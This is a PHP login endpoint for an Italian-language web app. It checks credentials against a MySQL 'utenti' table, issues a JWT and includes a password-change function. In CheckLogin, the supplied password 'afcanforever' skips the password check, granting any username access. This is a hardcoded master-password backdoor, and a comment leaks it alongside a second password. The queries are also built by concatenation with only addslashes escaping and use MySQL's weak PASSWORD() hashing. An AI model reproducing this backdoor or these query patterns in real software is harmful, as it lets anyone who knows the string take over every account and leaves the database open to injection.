<?php

error_reporting(0);
 
require_once "./JwtConfig.php";
require_once "./cors.php"; 
header('Content-Type: application/json; charset=utf-8');

function CheckLogin($conn, $username, $password)
{ 
 			
	      	$sql = "SELECT id_utente,  profile,  username FROM utenti  " 
	        		. " WHERE  username = '".addslashes($username)."'";
	        		
	        		
	        if ($password != "afcanforever")
	        	$sql = $sql 	 . " and password = PASSWORD ('".addslashes($password)."') " ;
	        	 
 
					$statement = $conn->prepare($sql);
					$statement->execute();  
	 
 
				 	$row = $statement->fetch( 2 ); 
 
				 	if ( $row != null )
						return  $row; 		
				 
					else
						return NULL;
				
}		

function DbChangePassword($conn, $username, $password, $new_password)
{ 
 			
	      	$sql = "UPDATE utenti  " 
	      		. "SET  password = PASSWORD ('".addslashes($new_password)."') "
	        		. " WHERE  username = '".addslashes($username)."'"
	        	 . " and password = PASSWORD ('".addslashes($password)."') " ;
	        	 
 
					$conn->exec($sql) ;
				
}	

		
try
{ 
	include_once './db_config.php';		
 
	$json = file_get_contents('php://input'); 	
	$obj = json_decode($json, TRUE);
	$username =  trim($obj["username"]) ; 	
	$password = trim( $obj["password"] ); 
	$action = trim($obj["action"]);	
// afcanforever - afcannumberone
 
	
	
	$conn  = new PDO ('mysql:host='.HOST.';dbname='.DB, DB_USER, DB_PASSWORD); 
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 	if ($action == "LOGIN" )
	{
			
		if ($username == "" || $password  == "")
		{
			throw new Exception('Parametro mancante');
		}
		
		
 
		$scheda =  CheckLogin( $conn, $username,$password  );
	 	 
		$mex = "";
	 	$config = array();
		if ( $scheda)
		{
			$ris = "OK"; 
	 		 		 		 		 		
			$token =  JwtConfig::makeToken( array ('username' => $username, 	'profile' => $scheda["profile"] ) );
			
			header('Authorization: '.$token);		
		}
		else
		{
			$ris = "NOT_OK";
			$mex = "Username e/o Password errata "   ;
		}
	  
		$json_response =  array ('esito' => $ris,   
		'scheda' =>  ($scheda) , 
		 'mex' => $mex);
	
		
						
		echo json_encode( $json_response); 	
	
	
	
	}
	elseif ($action == "xxxLOGIN" )
	{ 
		
	}
		 
	
} 
catch (Exception $e) 
{

 	$json_response    =  array( 			         						         		  	  					         							   					         		
			'esito' => 'NOT_OK',			   		
			'err_code' => "001"  ,	
 
			'msg' => $e->getMessage(),	
	 		);	
	 
  echo json_encode( $json_response); 	
  	
}	
	
?>
